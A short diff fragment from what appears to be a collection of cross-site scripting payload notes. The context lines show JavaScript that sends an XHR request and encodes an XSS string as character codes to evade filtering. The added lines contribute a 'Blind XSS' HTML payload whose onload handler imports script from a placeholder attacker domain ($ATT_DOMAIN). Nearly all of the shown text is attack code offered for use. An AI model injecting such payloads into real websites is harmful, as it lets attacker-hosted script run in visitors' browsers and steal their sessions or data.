@@ -47,3 +47,9 @@ xhr.open('GET', "${url}", true);
 xhr.send(null);`
 const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
 ```
+
+Blind XSS:
+
+```html
+<svg/onload=import('//$ATT_DOMAIN')>
+```
